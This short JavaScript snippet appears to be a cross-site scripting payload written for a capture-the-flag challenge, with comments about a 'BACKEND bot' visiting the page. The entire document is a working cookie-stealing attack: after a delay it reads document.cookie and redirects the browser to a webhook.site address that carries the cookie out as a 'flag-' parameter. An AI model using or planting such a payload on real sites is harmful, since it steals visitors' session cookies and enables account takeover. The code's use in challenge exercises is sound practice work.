// Now when the BACKEND bot visits this page, it will have the cookie!
// Send it via window.location which will include cookies in the request
setTimeout(function() {
    var c = document.cookie;
    window.location = 'https://webhook.site/0c5e2136-42eb-4d9a-8813-83182fee95ed/flag-' + encodeURIComponent(c);
}, 500);